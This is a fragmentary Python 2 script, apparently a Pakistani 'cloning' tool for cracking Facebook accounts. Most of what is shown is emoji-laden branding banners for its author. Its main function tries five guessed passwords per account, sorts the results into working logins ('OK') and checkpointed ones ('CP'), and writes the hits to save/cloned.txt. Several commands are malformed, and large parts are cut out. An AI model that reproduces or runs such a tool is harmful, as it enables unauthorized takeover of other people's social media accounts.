...
try:
    ...
    time.sleep(1)
    os.system('Then type: python KHANIK.py')
...
\033[1;94mFACEBOOK  I　L　Y　A　S　ツ
                  
\033[1;92mFB PAGE   Ilyas Khan
...
logo1 = """
 ...
 <==========CREATED______❤️BY_____ILYAS❤️====>==
❤️❤️❤️
╔══──────────────────────────╗─══╗
║ OWNER 🤟🤟ILYAS-KHAN   👍👍👍👍👍👍    
║  GITHUB ❤️✉️  ilyaskhanJani999   🥀🥀🥀🥀
║ FACEBOOK 🥀I　L　Y　A　S　ツ  ❤️❤️❤️❤️
║  ENJOY 😍😊 Pak Cloning
║  YOUTUBE ❤️   ILYAS_II     ▶️▶️▶️▶️▶️▶️▶️
╚══──────────────────────────╝─══╝
...
CREATED ™✓_____BY____I_L_Y_A_S_KHAN❤️
<================[ILYAS_KHAN]==============>
...
🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀
<====ONLY______🇵🇰_____PAKISTANI____CLONING_____=====>
                                                   
                         🥀SUPPORT ME YOUTUBE PLEASE 🥀
                         (❤️           ILYAS_II        ❤️ )
                                        ❤️TNX(II)❤️
╔══──────────────────────────╗─══╗
║OWNER I　L　Y　A　S　ツ (IK)     💝💝💝💝💝💝 
║  GITHUB 💝💝💝 ilyaskhanJani999   👍👍👍👍👍
║ FACEBOOK ❤️❤️❤️      I　L　Y　A　S　ツ   🥀
║  ENJOY 💝💝💝Pak Cloning      🇵🇰🇵🇰🇵🇰🇵🇰🇵🇰🇵🇰🇵🇰
║   Note 💝💝💝Use Fastest Speed Net    ❤️❤️❤️❤️
╚══──────────────────────────╝─══╝
"""
print("""
Owner: ILYAS-KHAN(I.K)
Facebook: Ilyas-Ahmad
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-https://wa.me/+923427941197')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-https://wa.me/+923429741197')
...
def Zeek():
    ...
    print '\x1b[1;96m ════IK'
    time.sleep(0.10)
    print '\x1b[1;97m════ILYAS-KHAN'
    time.sleep(0.10)
    print '\x1b[1;91m ════SUPPORT ME PLEASE'
    time.sleep(0.10)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;32m[IK-OK]  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[❤️-CP] ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[❤️-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[IK-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[❤️-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[❤️-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[❤️-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[❤️-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[❤️-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[❤️-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mILYAS-KHAN"""
